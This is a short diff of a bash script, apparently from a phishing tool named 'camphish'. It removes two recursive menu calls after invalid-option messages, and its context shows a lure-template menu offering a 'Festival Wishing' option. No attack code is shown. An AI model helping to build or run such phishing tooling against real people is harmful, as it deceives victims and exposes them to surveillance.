@@ -133,7 +133,7 @@ printf "\e[1;41m [!] Invalid tunnel option! try again\e[0m\n"
 sleep 1
 clear
 banner
-camphish
+
 else
 printf "\n-----Choose a template----\n"
 printf "\n\e[1;41m[\e[0m\e[1;34m01\e[0m\e[1;41m]\e[0m\e[1;41m Festival Wishing\e[0m\n"
@@ -250,7 +250,7 @@ else
 printf "\e[1;41m [!] Invalid option!\e[0m\n"
 sleep 1
 clear
-camphish
+
 fi
 
 }
